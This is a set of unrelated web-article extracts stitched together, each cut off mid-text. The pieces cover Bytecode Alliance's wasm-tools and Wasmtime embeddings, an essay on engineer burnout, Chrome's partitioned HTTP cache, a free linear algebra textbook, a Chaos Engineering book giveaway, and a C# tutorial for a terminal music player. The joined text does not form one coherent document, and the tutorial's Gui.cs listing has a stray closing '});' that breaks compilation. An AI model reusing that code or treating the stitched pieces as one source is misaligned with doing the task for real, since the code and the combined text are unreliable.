  <li>can target WebAssembly, and</li>
  <li>has support for these cutting edge standards</li>
</ol>

<p>To help language communities speed up their adoption, we’ve started building out <a href="https://github.com/bytecodealliance/wasm-tools"><code>wasm-tools</code></a>. This is a standard set of tools that other compilers can use to target WebAssembly.</p>

<p>These are all tools that we use in Wasmtime, so as new WebAssembly features come online, they are supported here. For example, we’ve already started building support for module-linking into these tools.</p>

<p>The tools currently include:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmparser"><code>wasmparser</code></a>, which is a parser for WebAssembly files. It’s quite cheap because it doesn’t do any extra allocations, and can parse in a streaming fashion.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasmprinter"><code>wasmprinter</code></a>, which translates a .wasm binary format into the .wat text format, which is useful for debugging and testing.</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wat"><code>wat</code></a> and <a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wast"><code>wast</code></a>, which translate the .wat and .wast text formats into the binary format, which is useful for running tests (since it’s easier to maintain tests in the text format).</li>
  <li><a href="https://github.com/bytecodealliance/wasm-tools/tree/main/crates/wasm-smith"><code>wasm-smith</code></a>, which is a <a href="https://fitzgeraldnick.com/2020/08/24/writing-a-test-case-generator.html">test case generator</a>. It generates pseudo-random Wasm modules, guaranteed to be valid Wasm modules, which we use for fuzzing.</li>
</ul>

<p>We will be adding more tools over the next year. For example, we will host the language-independent parts of the <a href="https://github.com/bytecodealliance/wasm-interface-types">Rust Interface Types toolkit</a> in <code>wasm-tools</code>, which will make it easier for languages that compile to WebAssembly to start supporting Interface Types. We also plan to collaborate with language communities on integrating these tools as they come online.</p>

<h3 id="more-languages-embedding-webassembly-via-wasmtime">More languages embedding WebAssembly via Wasmtime</h3>

<p>If you have a whole WebAssembly application, you can run that directly in a runtime like Wasmtime. But sometimes, you just want to run a little bit of WebAssembly in your project.</p>

<p>For example, you might be writing some Python code, but want to do some intensive computations. Python may be too slow, and native extensions may be too frustrating to use portably, so you could use a WebAssembly module instead.</p>

<p>Wasmtime is enabling this for many languages, through embeddings into the language runtimes.</p>

<p><img src="https://bytecodealliance.org/articles/img/1-year-update/wasmtime-embedding.png" alt="&quot;Wasmtime in the center, with arrows pointing to logos for all of the languages listed below&quot;"></p>

<p>These languages now have support for running WebAssembly in Wasmtime:</p>
<ul>
  <li><a href="https://github.com/bytecodealliance/wasmtime-py">Python</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-go">Go</a></li>
  <li><a href="https://github.com/bytecodealliance/wasmtime-dotnet">.NET</a></li>
  <li>Java (two options: <a href="https://github.com/kawamuray/wasmtime-java">kawamuray/wasmtime-java</a> or <a href="https://github.com/bluejekyll/wasmtime-java">bluejekyll/wasmtime-java</a>)</li>
  <li><a href="https://metacpan.org/pod/Wasm">Perl</a></li>
  <li><a href="https://bytecodealliance.github.io/wasmtime/lang-rust.html">Rust</a></li>
  <li><a href="https://github.com/kubkon/wasmtime-zig">Zig</a></li>
  <li><a href="https://github.com/dtcristo/wasmtime-ruby">Ruby</a></li>
</ul>

<p>As new nanoprocess features come online, they get added to Wasmtime. We don’t consider feature development complete until the feature is exposed in the language embeddings that we maintain. That means that these languages can run the most cutting-edge WebAssembly modules as soon as possible.</p>

<p>It also means that these language communities don’t have to come up with their own ways of doing linking and binding. They can just depend on the WebAssembly standards, which makes everything more interoperable.</p>

<p>In the last year, we’ve transitioned the embeddings we maintain to …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the past few weeks I wrote about <a href="https://www.spakhm.com/p/how-to-get-promoted">corporate politics</a>, <a href="https://www.spakhm.com/p/parallel-tracks">distribution of power</a>, and <a href="https://www.spakhm.com/p/an-open-letter-to-my-friends-with">disregard for ethics</a>. Dozens of people reached out to say the posts were dark, cynical and depressingly accurate. There are more dark posts I can write— about lies in venture capital, the devastating price of failure, the destructive aspect of creative relationships, the ubiquity of envy. But I think I've gotten my point across. The industry can be depressing. I now want to concentrate on a different question: what to do with this knowledge.</p><p>The word "possession" means owning things, but it also means things owning you. Knowledge can possess people. Once you observe the darker side of human nature in the technology industry, you cannot forget or unsee it. The subsequent cynicism can be so disheartening that the romance of the computer revolution is beat out of people completely.</p><p>I've met many engineers with extraordinary talent who decided to stop making software. They wanted to program computers all their lives. They were born for it. After spending six, eight, ten years in the industry, they quit for good. Now they're running breweries and hydroponic farms, with no desire to ever again touch a compiler, let alone get back into the fray.</p><p>There is nothing wrong with brewing beer or growing hydroponic tomatoes. What's sad is that people weren't pulled into their new occupation by better financial opportunities or conviction; instead they were pushed away from technology. If brewing paid as much as programming, it still wouldn't have been their first choice. Something had to have gone wrong for them to abandon their first love.</p><p>In <a href="https://amzn.to/35ATS95">Zen Mind, Beginner's Mind</a>, Shunryu Suzuki says:</p><blockquote><p>For us, the monastic life was the usual life, and the people who came from the city were unusual people. When we saw them we felt, “Oh, some unusual people have come!” But once I had left Eiheiji and been away for some time, coming back was different. I heard the various sounds of practice—the bells and the monks reciting the sutra—and I had a deep feeling. There were tears flowing out of my eyes, nose, and mouth! It is the people who are outside of the monastery who feel its atmosphere. Those who are practicing actually do not feel anything. I think this is true for everything.</p></blockquote><p>I still remember the feeling when I first glanced inside the monastery. My parents bought me a ZX Spectrum computer connected to an old Soviet TV and cassette player, a few bootleg games, and a Z80 assembly manual printed on a dot matrix printer that was out of ink; about one tenth of the text was unreadable. I spent countless hours playing games, learning BASIC and Z80 assembly, and deciphering the missing parts of the manual. I don't remember much else from that time. That little machine was a window into a different world— limitless, safe, and totally engaging. At the time, nothing else mattered.</p><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/0cece565-e603-408e-bf0b-929ca8460009_1511x1046.jpeg&quot;,&quot;height&quot;:1008,&quot;width&quot;:1456,&quot;resizeWidth&quot;:656,&quot;bytes&quot;:206242,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p>My next computer was an IBM machine with an i386 processor, 2MB of RAM (the ZX Spectrum had 16KB), a 30MB hard disk, and a five inch floppy drive. I could load programs in seconds instead of minutes. I could run Dune 2 and Wolfenstein 3D and hex editors and Prince of Persia and MS DOS and Borland Turbo Pascal and Civilization and a C compiler and Windows 3.1. I could save stuff! I remember studying Win16 APIs and feeling like I made contact with an advanced alien civilization. As I type this now, I still have sense memory of that machine. The rubbery smell, the buzzing sound of the CRT monitor, the springy feel of the keyboard (with proper arrow keys and all sorts of extra buttons!)</p><p>Then my friend's parents bought him an i486 machine with 4MB of RAM. It could run Doom. Everything changed again. You didn't even need to play to know that computer history was just delineated into before and after. As soon as you saw the artwork of the game menu, you knew. Doom changed me in a profound way. I used to never think about computers or programming. It was just something I loved to do more than anything else. But a few seconds of Doom gameplay permanently flipped a bit in my brain. It made me aware that programming computers is what I want to be doing for the rest of my life.</p><p>After that came the internet, and with it a whirlwind of new worlds. Some were brand new. Others were old, but the internet gave me the opportunity to access them for the first time. Windows 95, newsgroups, geocities, ICQ, Visual Studio, Diablo, Starcraft, 3Dfx Voodoo Banshee, Gamedev.net, IRC, Slashdot, DirectX, Windows NT, Java, OpenGL, NewEgg, Winamp, Napster, Deus Ex, World of Warcraft, Linux, Emacs, GPL, Google, Common Lisp, Standard ML, Smalltalk, the iPhone, Oculus Rift. Each had its own unique atmosphere. Each was a window into a different universe. Each one felt limitless. Safe. Engaging.</p><p>Everything, from the first ZX Spectrum to Oculus Rift was punctuated by countless books of science fiction. My dad introduced me to the genre with Jules Verne's The Mysterious Island, in which a team of five end up on an uninhabited island, and use their knowledge and ingenuity to rebuild a technological civilization from scratch. I remember reading this novel over and over, completely enthralled. I tried some of the experiments, with intermittent success.</p><p>My parents had a few shelves stacked with books, and I spent countless nights losing myself in them. I read everything by Jules Verne I could get my hands on, including From the Earth to the Moon, Twenty Thousand Leagues Under the Sea, Around the World in Eighty Days, and Journey to the Center of the Earth. After Verne I moved on to Ray Bradbury (The Veldt), Arkadiy and Boris Strugatsky (Prisoners of Power), Stanislaw Lem (the fantastical Summa Technologiae). I also read every story we had by Jack London— I couldn't imagine anything more exciting than the combination of science fiction and the romance of the American frontier. Today, nearly thirty years later, I still can't.</p><p>After we moved to America I learned that there is an enormous universe of science fiction that I missed as a child. I started filling the gaps and read stories and novels by Isaac Asimov, Arthur Clarke, William Gibson, Neal Stephenson, Ian Banks, Philip Dick, Cory Doctorow, Charlie Stross, Dan Simmons, Jack Vance, and Vernor Vinge. I also continued reading Russian science fiction. I read everything by Strugatsky brothers, and binge-read the pulpy Russian spin on the cyberpunk genre by Sergei Lukyanenko.</p><p>As I grew older I shifted to reading about megaprojects and the intersection of technology and commerce. I read about railroads, electrification, aviation, radio, television, silicon, and the stories of Bell Labs, Microsoft, The Manhattan Project, and The Apollo program. How the heck did we invent all this stuff, wire the planet, speed up transportation by two orders of magnitude, go to space, put a computer on every desk, and then, as if it weren't enough, put a supercomputer in every pocket?! How did we do all <em>that</em>?!</p><p>Sometimes I imagine what would happen if I could send my ten year old self a letter and tell him I could press a button and read <a href="https://amzn.to/2TrADJK">Masters of Doom</a> the next day, instantly send a short message to John Carmack from <em>anywhere</em> using an always connected supercomputer in my pocket, or that I worked for a company that published <a href="https://amzn.to/2HsSXQm">The Making of Prince of Persia</a>. He would have been over the moon!</p><p>But sitting at a mandated retrospective or mindlessly gluing APIs together doesn't put me over the moon. It makes me feel the opposite (whatever the opposite of being over the moon is). And so, engineers are faced with two realities. One reality is the atmosphere of new technology, its incredible power to transform the human condition, the joy of the art of doing science and engineering, the trials of the creative process, the romance of the frontier. The other reality is the frustration and drudgery of operating in a world of corporate politics, bureaucracy, envy and greed— a world <em>so</em> depressing, that many people quit in frustration, never to come back.</p><p>If you work in technology, the monastery can be distant and vague, whereas Paul from marketing wants to circle back with you here and now. Then, as you circle back again and again, the monastery recedes further into the distance, and the drudgery appears closer and closer, until it occupies your entire field of vision and you can't see anything else.</p><p>I have friends in the medical field, and they vent about drudgery and endless bureaucracy <em>all the time</em>. They have more roadblocks than we do, and theirs are objectively worse than ours. The hours are longer, the bureaucracy is more entrenched, the regulators mandate their time be wasted on bullshit, and mistakes can have devastating consequences. Yet I haven't heard of a single doctor who quit his practice and moved to Colorado to run a ski lodge. When I ask why, they all give the same response: the patients. Every day they see patients brought back to health, the bullshit recedes into the background, and they're reminded why they got into medicine.</p><p>The default in engineering is different. We don't have a daily ritual built into our jobs that reminds us why we got into the field. Without a ritual, the drudgery creeps closer and the vision of the monastery recedes. So we must be very deliberate in developing rituals to keep the two realities in their proper proportion.</p><p>I think the reason many engineers have trouble with this is that so much of our field is about knowledge, but rituals aren't about knowledge at all— they're about practice. You must develop a daily mantra, a spell, a routine, whatever you want to call it, and then perform it religiously. I needed a lot of trial and error to get it right, and I’m still playing with the details. The internet desensitized me to text and video. Anything that happens in front of a screen doesn't help with perspective anymore. But I discovered that getting away from the screen and handling physical items does.</p><p>I don't know what will work for you, but here are a few ideas. Read used hard cover …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When I started doing web development, we all loaded jQuery from the official global jQuery CDN.</p><p>The idea was straightforward: if everybody loads the same jQuery script file (<code>cdn.jquery.com/jquery.latest.js</code> – or whatever URL it was back then), then the script file would be cached by the browsers, and other sites requesting the same script would benefit from the speedup of already cached resources. Users would have popular libraries like jQuery already sitting in their browser cache because earlier visited sites requested them.</p><p>This caching behavior was possible because, at the time, the browser's HTTP caches used the asset URL (<code>cdn.jquery.com/jquery.latest.js</code>) as a single cache key. Browsers use cache keys to figure out if and how to cache a resource. If these keys only consist of the resource URL, it allows the reuse of resources across sites and domains.</p><p>All this worked great, but as it is with many great inventions in web technology, <strong>cross-site resource caching enabled new ways to track users across different sites</strong>.</p><p>As an example, let's assume Facebook loads a unique file in their logged-in area (<code>fb-logo-ajgdmaks839–as.svg</code> – I totally made that file path up); if I would know the file path to such a file, request it on <code>stefanjudis.com</code> and see a rapid response coming from the browser cache, I can almost be sure that the user has logged into Facebook lately.</p><h2 id="new-http-cache-keys-in-google-chrome"><a href="#new-http-cache-keys-in-google-chrome">#</a> New HTTP cache keys in Google Chrome</h2><p><a href="https://bugs.webkit.org/show_bug.cgi?id=110269">Webkit (Safari) changed its caching strategy already in 2013</a> to prevent user tracking via the browser cache. Its cache keys are a combination of the requested resource URL and the top-level-domain requesting the resource.</p><p><em>☝️ Big thanks to <a href="https://twitter.com/tomayac/status/1317861511784792067?s=20">Thomas Steiner who gave input on that matter</a>.</em></p><p>On the bright side, this key structure prevents the mentioned tracking possibilities; unfortunately, it also leads to duplicated resources in the browser cache.</p><p>And... it hinders third-party resource sharing across the internet.</p><pre><code>Browsers duplicate resources with different keys:

cdn.jquery.com/jquery.latest.js-amazon.co.uk
cdn.jquery.com/jquery.latest.js-www.stefanjudis.com
</code></pre><p>Starting with v86, Chrome will be using combined cache keys, too. This change means that it's time to say goodbye to third-party resource-sharing across the web. <a href="https://www.statista.com/statistics/544400/market-share-of-internet-browsers-desktop/">With Chrome's market share of roughly 70%</a>, most browsers hitting our sites will use partitioned browser caches from now on. Chrome went for combining the top-level site URL, the current frame site URL, and the resource URL. This approach is more granular than what Safari does, but the result is the same.</p><p>If your sites request the global jQuery, modules from <a href="https://unpkg.com/">unpkg.com</a>, font files from <a href="https://fonts.google.com/">Google fonts</a> or GA's (Google Analytics) <code>analytics.js</code>, <strong>users will redownload the resources no matter if they downloaded and cached them for other sites already.</strong></p><p>What does this change mean for you? If your sites live on modern hosting that provides a CDN and supports HTTP/2, you can drop the third-parties and should ship all resources yourself. Relying on a third-party provides little value in 2020.</p><p>I have mixed feelings about these changes. It's excellent that browsers consider privacy, but it looks like anything can be misused for tracking purposes these days. I wonder where we're going with this... 😢</p><p>If you're interested in learning more on this topic you can give <a href="https://shkspr.mobi/blog/2020/10/please-stop-using-cdns-for-external-javascript-libraries/">Terence Eden's post "Please stop using CDNs for external Javascript libraries"</a> or <a href="https://andydavies.me/blog/2018/09/06/safari-caching-and-3rd-party-resources/">Andy Davies' post "Safari, Caching and Third-Party Resources"</a> a read, too.</p><p>And hey, this post was trending on Hacker News. 🎉 If you're interested, here's <a href="https://news.ycombinator.com/item?id=24894135">are the Hacker News comments</a>.</p></div></div>]]>

	  <a href="http://joshua.smcvt.edu/linearalgebra/jhanswer.pdf">answers to exercises</a>, 
	  is a text for a first undergraduate course.
	  It is Free.
	  Use it as the main book, as a supplement, or for independent study.
	</p>

	<h3>
	  Highlights
	</h3>
	
	<ul>
	  <li><span>Standard coverage</span>
            Linear systems and Gauss's method, 
	    vector spaces, linear maps and matrices, determinants,
	    and eigenvectors and eigenvalues.
          </li>
	  
	  <li><span>Developmental approach</span>
	    The book proves all of the results
	    but does not start by assuming that 
	    students are already able at abstract work.
	    Instead, it proceeds with a great deal of
	    motivation, many computational examples, 
            and many exercises.
	    The goal is to raise 
            each student's level of 
	    mathematical maturity.
          </li>
	  
	  <li><span>Extensive exercise sets</span>   
            Each subsection has a wide range of exercises,
            from 
	    routine verifications to a few challenges.
	    The
	    <a href="http://joshua.smcvt.edu/linearalgebra/jhanswer.pdf">solution book</a>
	    has each answer completely worked.
	    In addition, clicking on a problem 
	    takes you to its answer
	    while clicking on the answer takes you back to the problem.
          </li>
	  
	  <li><span>Popular</span>
	    Used in hundreds of classes at many schools, 
            as well as by thousands of people
            for independent study.

	  <li><span>Applications</span>
            Each chapter finishes with four or five short  
	    supplemental topics
            for reading or projects, or for
            small group work. 
          </li>

<p>I was hired at Netflix to lead the Traffic Team in early 2015. A few weeks later I was also asked to charter a Chaos Engineering Team. At the time, Chaos Engineering was essentially a program called Chaos Monkey with a few supporting blog posts. I wanted to get a feel for what our engineers thought about the practice, so I asked around: “What is Chaos Engineering?” The response I usually heard was, “Oh, that’s when we break stuff in production.”</p>



<p>As cool as that sounds, I could break stuff in production all day long and not provide any value to Netflix. I wanted to keep my job, not cause pointless havoc. So instead, I sat down with my team and defined Chaos Engineering as a proactive discipline to improve availability. We borrowed heavily from the field of Resilience Engineering and other research outside of the software industry to frame a practice of experimentation that follows in the best traditions of western science. Our definition is still published at <a href="http://principlesofchaos.org/" target="_blank" rel="noreferrer noopener">http://principlesofchaos.org/</a>. The point of Chaos Engineering isn’t to create chaos; it’s to chart a path of confidence through the chaos.</p>



<p>Working at Netflix was a highlight of my journey with Chaos Engineering. Another is co-authoring and publishing “Chaos Engineering: System Resiliency in Practice” with Nora Jones (Jeli.io). And now I am thrilled to have the opportunity to give away free e-copies of my book.</p>



<h2>Why Chaos Engineering is So Important Now</h2>



<p>Remote communication is literally saving lives during the pandemic. Never before have so many people relied on digital infrastructure to perform even basic tasks like getting food. The massive migration to remote work and remote education has irrevocably changed the course of societal structures, norms, and communication.</p>



<p>Work and school for hundreds of millions of people moved online in a matter of weeks. This is a monumental change to the most complex sociotechnical system we will ever be a part of. We don’t have access to a control group in this experiment. We only have one shot to get this right. The stakes are high.</p>



<p>With high stakes comes the opportunity for high value. The safety and reliability of the digital systems that we are suddenly so dependent on has never been more obvious. We have the opportunity and the responsibility to innovate in the areas of availability and security, to make these systems better in ways that matter to people.</p>



<p>The old methods won’t cut it. They aren’t bad, but they aren’t sufficient. Incident response management, alerting, metrics/logging, disaster recovery—all great, but also all reactive. They focus on time-to-detect and time-to-remediate. We need proactive methods. TDD, pair programming, peer code reviews, syntax scanning, QA—also great, but they won’t move the needle on availability or security in a complex system. You can’t expect a human to provide safety guarantees on something (a complex distributed system) that by definition is beyond the capability of a human to mentally model.</p>



<p>Chaos Engineering is a proactive approach to improving the safety properties of complex systems. We have an imperative to lean into these new, innovative approaches to help us cope with the increasing complexity and stress that our organizations are in. If you feel like your organization is facing unprecedented demands and requirements from a reliability perspective, you are in good company: most of us operating systems at scale are in that same position. With Chaos Engineering, you have an opportunity to meet those demands and navigate that complexity.</p>



<h2><strong>In the Book</strong></h2>



<p>This book explains where Chaos Engineering came from and provides some mental models to challenge the current mainstream thinking on system reliability. We then provide chapters contributed by authors from Slack, Google, Microsoft, LinkedIn, and CapitalOne, so that you can hear in their own words how people responsible for critical systems at scale are embracing Chaos Engineering to meet the challenges of the day. We also explore a bit outside of the typical boundaries of distributed software engineering to take a look at the future of the practice as well as its impact in manufacturing, autonomous vehicles, human systems, cyber security, and Continuous Verification.</p>



<h2><strong>We Want You to Have the Book… for Free</strong></h2>



<p>Nora and I wrote the most comprehensive, practical guide to Chaos Engineering. We even dedicated an entire chapter to establishing ROI so that you can see how Chaos Engineering has a positive effect. </p>



<p>Now Verica is sponsoring this book so that we can send you a digital copy for free. As a company, we believe the concepts explored within have the potential to completely change for the better how people build, operate, and maintain systems at scale.

								behavior of a system. Much like Chaos Engineering, CV platforms can include
								Availability or Security components and often express these as hypotheses. Like
								CI/CD, the practice is born out of a need to navigate increasingly complex systems.
								Organizations do not have the time or other resources to validate that the internal
								machinations of the system work as intended, so instead they verify that the output
								of the system is inline with expectations. This is the preference for verification
								over validation that hallmarks successful management of complex systems.”

						</div>
						<p>
							There are many properties of a complex system that cannot be designed in the traditional
							sense, but that a business still needs to optimize. Take availability as an example.
							There are many approaches to improving availability. Some examples include: Incident
							Management, Alerting, Service Degradation, Observability Instrumentation, Disaster
							Recovery, Postmortem Facilitation, etc. What all of these approaches have in common is
							that they are aimed at improving time to detection (TTD) and time to remediation (TTR)
							of an incident. They are all reactive.
						</p>
						<p>
							When we sat down to define Chaos Engineering, we set out to build a discipline that was
							proactive. Chaos Engineering draws from the rich history of empirical experimentation to
							proactively discover vulnerabilities in complex systems. The culmination of this was the
							Chaos Automation Platform (ChAP) built by my team at Netflix.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>Recently, I’ve been listening to a lot of <a href="https://somafm.com/" target="_blank">SomaFM</a> internet radio streams while I work as they have a lot of terrific commercial-free programming. One day while being creatively inspired by the Sonic Universe station’s offerings, I had the idea of creating my own music player with support for streaming. Not only would this be a great project for continuing to learn C# and Dotnet Core, but it would also allow me to build a simple, lightweight player customized to my liking! After a brainstorming session, I came up with the name MusicSharp and a core list of features I planned to implement:</p>

<ul>
  <li>Play audio files and streams</li>
  <li>Save and load playlists</li>
  <li>Be lightweight</li>
  <li>Be CLI-based</li>
</ul>

<p>Moreover, I also wanted to make sure that I made use of Test Driven Development and code linting within the project. For this project, I’m making use of Stylecop to enfore proper code style. For the curious, you can view the entire MusicSharp code repository in its current state <a href="https://github.com/markjamesm/MusicSharp" target="_blank">on Github</a>. I highly recommend following the repo to keep up to date with the latest commits (and a star wouldn’t be too bad either :-P)!</p>

<h2 id="getting-started">Getting Started</h2>

<p>Armed with a name and an idea, the next thing I needed was to settle on was which C# libraries I would use to implement the UI and audio functionality. After doing some research, I decided that the optimal solution would be to use <a href="https://github.com/migueldeicaza/gui.cs" target="_blank">Terminal.Gui</a> for the UI elements and <a href="https://github.com/naudio/NAudio" target="_blank">NAudio</a> to handle the audio side of things. Created by Miuel de Icaza (the creator of Mono and Xamarin), Terminal.Gui is a cross-platform library for building console-based applications that work on monochrome terminals as well as modern terminals with mouse support. Leveraging Termnial.Gui to build the UI, I chose NAudio to handle the audio playing capabilities of MusicSharp as its a mature C# library.</p>

<h2 id="mocking-up-a-simple-ui">Mocking up a simple UI</h2>

<p>With some of the preliminary items out of the way, my next step was to work on some wireframe mockups to see what kind of UI I might want to create. I’ve used a lot of music players over my life (including CLI ones), and so I have a good idea of what music players should have. Slowly, I started breaking down the different elements I thought would need and came up with the following:</p>

<ul>
  <li>A menu bar</li>
  <li>A status bar</li>
  <li>A player section (with associated controls)</li>
  <li>A playlist browser</li>
</ul>

<p>I sketched out a few different UI layouts until I came up with the following which I felt would work for a first iteration:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-ui-mockup.png" width="366" height="302" alt="MusicSharp UI mockup"></p>

<h2 id="building-the-main-window">Building the Main Window</h2>

<p>Mockup in hand, I started diving into the Terminal.gui API docs in order to build my first window. I created a new Gui class in a file called Gui.cs with a method named Start(). Inside the Start method, I initialized Terminal.Gui and created a simple top-level window. Note that</p>

<div><div><pre><code><span>namespace</span> <span>MusicSharp</span>
<span>{</span>
    <span>using</span> <span>Terminal.Gui</span><span>;</span>

    <span>/// &lt;summary&gt;</span>
    <span>/// The Gui class houses the CLI elements of MusicSharp.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>class</span> <span>Gui</span>
    <span>{</span>
        <span>/// &lt;summary&gt;</span>
        <span>/// The Start method builds the user interface.</span>
        <span>/// &lt;/summary&gt;</span>
        <span>public</span> <span>void</span> <span>Start</span><span>()</span>
        <span>{</span>
            <span>// Creates a instance of MainLoop to process input events, handle timers and other sources of data.</span>
            <span>Application</span><span>.</span><span>Init</span><span>();</span>

            <span>var</span> <span>top</span> <span>=</span> <span>Application</span><span>.</span><span>Top</span><span>;</span>
            <span>var</span> <span>tframe</span> <span>=</span> <span>top</span><span>.</span><span>Frame</span><span>;</span>

            <span>// Create the top-level window.</span>
            <span>var</span> <span>win</span> <span>=</span> <span>new</span> <span>Window</span><span>(</span><span>"MusicSharp"</span><span>)</span>
            <span>{</span>
                <span>X</span> <span>=</span> <span>0</span><span>,</span>
                <span>Y</span> <span>=</span> <span>1</span><span>,</span> <span>// Leave one row for the toplevel menu</span>

                <span>// By using Dim.Fill(), it will automatically resize without manual intervention</span>
                <span>Width</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>(),</span>

                <span>// Subtract one row for the statusbar</span>
                <span>Height</span> <span>=</span> <span>Dim</span><span>.</span><span>Fill</span><span>()</span> <span>-</span> <span>1</span><span>,</span>
            <span>};</span>
            <span>});</span>

            <span>// Add the layout elements and run the app.</span>
            <span>top</span><span>.</span><span>Add</span><span>(</span><span>win</span><span>);</span>
            <span>Application</span><span>.</span><span>Run</span><span>();</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Inside my Program.cs file, I called the Start method like so:</p>

<div><div><pre><code>    <span>public</span> <span>static</span> <span>void</span> <span>Main</span><span>()</span>
    <span>{</span>
        <span>// Start MusicSharp.</span>
        <span>Gui</span> <span>gui</span> <span>=</span> <span>new</span> <span>Gui</span><span>();</span>
        <span>gui</span><span>.</span><span>Start</span><span>();</span>
    <span>}</span>
</code></pre></div></div>

<p>Running the program in this state produced the following result:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-first-build.png" width="750" height="402" alt="MusicSharp first build screenshot"></p>

<p>Success! We now have a top level window which dynamically resizes while leaving space on the top and bottom of the screen for statusbars.</p>



<p>The next step was to implement a top level menu, and fortunately this was easy to do with Terminal.Gui. Just aboce top.Add(win), I created the following code:</p>

<div><div><pre><code><span>// Create the menubar.</span>
<span>var</span> <span>menu</span> <span>=</span> <span>new</span> <span>MenuBar</span><span>(</span><span>new</span> <span>MenuBarItem</span><span>[]</span>
<span>{</span>
    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_File"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open"</span><span>,</span> <span>"Open a music file"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Open Stream"</span><span>,</span> <span>"Open a stream"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>

        <span>new</span> <span>MenuItem</span><span>(</span><span>"_Quit"</span><span>,</span> <span>"Exit MusicSharp"</span><span>,</span> <span>()</span> <span>=&gt;</span> <span>Application</span><span>.</span><span>RequestStop</span><span>()),</span>
    <span>}),</span>

    <span>new</span> <span>MenuBarItem</span><span>(</span><span>"_Help"</span><span>,</span> <span>new</span> <span>MenuItem</span><span>[]</span>
    <span>{</span>
        <span>new</span> <span>MenuItem</span><span>(</span><span>"_About"</span><span>,</span> <span>string</span><span>.</span><span>Empty</span><span>,</span> <span>()</span> <span>=&gt;</span>
        <span>{</span>
            <span>MessageBox</span><span>.</span><span>Query</span><span>(</span><span>"Music Sharp 0.2.0"</span><span>,</span> <span>"\nMusic Sharp is a lightweight CLI\n music player written in C#.\n\nDeveloped by Mark-James McDougall\nand licensed under the GPL v3.\n "</span><span>,</span> <span>"Close"</span><span>);</span>
        <span>}),</span>
    <span>}),</span>
<span>});</span>
</code></pre></div></div>

<p>Here, I did a few things. Firstly, I created a new MenuBar which will house the Menu Bar Items. Next, I created each menu item (File and Help), and populated them with handy child items that we’ll need in our UI. These children take a name, optional descriptor, and a method as arguments, and for now I’m calling Application.RequestStop() on each of them to exit the application (Later I’ll be replacing these with the actual methods once I write them). In addition, I also created a simple about dialog box as a way to familiarize myself with Terminal.Gui. Compiling our code up to this point produces the following menu:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-menu.png" width="750" height="446" alt="Screenshot of the MusicSharp menu bar"></p>

<p>And a neat looking about dialog:</p>

<p><img src="https://markjames.dev/img/posts/music-sharp/MusicSharp-about-dialog.png" width="750" height="446" alt="Screenshot of the MusicSharp about dialog"></p>

<p>Although I still need to add some additional menu items (such as save/load playlist functionality), this gives us a great jumping off point for the next part, getting basic audio functionality working!</p>

<h2 id="playing-audio">Playing Audio</h2>

<p>Now that a very simple UI had been created, my next order of business was to test out NAudio and see how I could play an MP3 file as a simple proof of concept. In order to do so, I created a new file called Player.cs to house the audio playing related functions.</p>

<p>Inside the Player class, I created a PlayAudioFile() method which read an MP3 file from a static location on my PC and then played it using NAudio. The code looked like this:</p>

<div><div><pre><code><span>/// &lt;summary&gt;</span>
<span>/// The Player class handles audio playback.</span>
<span>/// &lt;/summary&gt;</span>
<span>public</span> <span>static</span> <span>class</span> <span>Player</span>
<span>{</span>
    <span>/// &lt;summary&gt;</span>
    <span>/// Method that implements audio playback from a file.</span>
    <span>/// &lt;/summary&gt;</span>
    <span>public</span> <span>static</span> <span>void</span> <span>PlayAudioFile</span><span>()</span>
    <span>{</span>
        <span>string</span> <span>file</span> <span>=</span> <span>@"C:\MusicSharp\Zhund-Dusty.mp3"</span><span>;</span>

        <span>// Load the audio file and select an output device.</span>
        <span>using</span> <span>var</span> <span>audioFile</span> <span>=</span> <span>new</span> <span>AudioFileReader</span><span>(</span><span>file</span><span>);</span>
        <span>using</span> <span>var</span> <span>outputDevice</span> <span>=</span> <span>new</span> <span>WaveOutEvent</span><span>();</span>

        <span>outputDevice</span><span>.</span><span>Init</span><span>(</span><span>audioFile</span><span>);</span>
        <span>outputDevice</span><span>.</span><span>Play</span><span>();</span>

        <span>// Sleep until playback is finished.</span>
        <span>while</span> <span>(</span><span>outputDevice</span><span>.</span><span>PlaybackState</span> <span>==</span> <span>PlaybackState</span><span>.</span><span>Playing</span><span>)</span>
        <span>{</span>
